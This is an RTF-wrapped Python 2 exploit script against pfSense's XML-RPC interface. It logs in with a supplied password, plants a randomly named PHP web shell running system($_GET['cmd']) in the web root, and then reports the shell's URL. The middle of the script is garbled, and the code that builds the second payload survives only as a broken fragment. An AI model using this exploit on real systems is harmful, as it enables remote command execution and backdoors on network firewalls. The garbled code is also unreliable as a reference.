{\rtf1\ansi\ansicpg1252\cocoartf1671\cocoasubrtf600
{\fonttbl\f0\fmodern\fcharset0 Courier;}
{\colortbl;\red255\green255\blue255;\red26\green26\blue26;\red254\green254\blue254;}
{\*\expandedcolortbl;;\cssrgb\c13333\c13333\c13333;\cssrgb\c99608\c99608\c99608;}
\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab720
\pard\pardeftab720\partightenfactor0

\f0\fs20 \cf2 \cb3 \expnd0\expndtw0\kerning0
#!/usr/bin/env python\cb1 \
\
\cb3 import argparse\cb1 \
\cb3 import requests\cb1 \
\cb3 import urllib2\cb1 \
\cb3 import time\cb1 \
\cb3 import sys\cb1 \
\cb3 import string\cb1 \
\cb3 import random\cb1 \
\
\cb3 parser = argparse.ArgumentParser()\cb1 \
\cb3 parser.add_argument("--rhost", help = "Target Uri https://127.0.0.1")\cb1 \
\cb3 parser.add_argument("--password", help = "pfsense Password")\cb1 \
\cb3 args = parser.parse_args()\cb1 \
\
\cb3 rhost = args.rhost\cb1 \
\cb3 password = args.password\cb1 \
\cb3 print ""\cb1 \
\
\
\cb3 command = "<?xml version='1.0' encoding='iso-8859-1'?>"\cb1 \
\cb3 command += "<methodCall>"\cb1 \
\cb3 command += "<methodName>pfsense.host_firmware_version</methodName>"\cb1 \
\cb3 command += "<params>"\cb1 \
\cb3 command += "<param><value><string>"+password+"</string></value></param>"\cb1 \
\cb3 command += "</params>"\cb1 \
\cb3 command += "</methodCall>"\cb1 \
\
\cb3 stage1 = rhost + "/xmlrpc.php"\cb1 \
\
\cb3 page = urllib2.urlopen(stage1, data=command).read()\cb1 \
\
\
\
\cb3 if "Authentication failed" in page:\cb1 \
\
\cb3   print "[-] Wrong password :("\cb1 \
\cb3   sys.exit(0)\cb1 \
\cb3 else:\cb1 \
\
\cb3   random = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(32)])\cb1 \
\
\cb3   \cb1 \
\
\cb3 system($_GET[\\"cmd\\"]); echo $res ?> </pre>\\\\' > /usr/local/www/"+random+".php');</string></value></param>"\cb1 \
\cb3   command += "</params>"\cb1 \
\cb3   command += "</methodCall>"\cb1 \
\
\cb3 stage1 = rhost + "/xmlrpc.php"\cb1 \
\
\cb3 page = urllib2.urlopen(stage1, data=command).read()\cb1 \
\
\cb3 final = rhost+"/"+str(random)+".php"\cb1 \
\
\cb3 check = urllib2.urlopen(final)\cb1 \
\
\cb3 print "[+] Checking ....."\cb1 \
\
\cb3 if check.getcode() == 200:\cb1 \
\
\cb3   print "[+] Yeah! You got your shell: " + final+"?cmd=id"\cb1 \
}